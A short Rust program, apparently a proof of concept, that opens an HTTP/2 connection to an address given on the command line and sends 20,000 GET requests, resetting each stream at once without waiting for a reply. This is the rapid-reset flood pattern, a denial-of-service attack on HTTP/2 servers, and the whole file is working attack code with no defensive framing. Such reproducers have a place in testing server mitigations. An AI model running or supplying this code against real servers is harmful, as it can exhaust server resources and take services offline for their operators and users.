#[tokio::main]
async fn main() {
    let origin = std::env::args().nth(1).unwrap();
    let addr = origin.parse::<std::net::SocketAddr>().unwrap();

    println!("Connecting to http://{addr}");

    let tcp_stream = tokio::net::TcpStream::connect(addr).await.unwrap();
    let (mut client, h2_conn) = h2::client::handshake(tcp_stream).await.unwrap();

    tokio::spawn(h2_conn);

    for _ in 0..20_000 {
        let (res, mut send_stream) = client
            .send_request(http::Request::get("/").body(()).unwrap(), false)
            .unwrap();

        // let _res = res.await.unwrap();

        send_stream.send_reset(h2::Reason::NO_ERROR);
    }
}
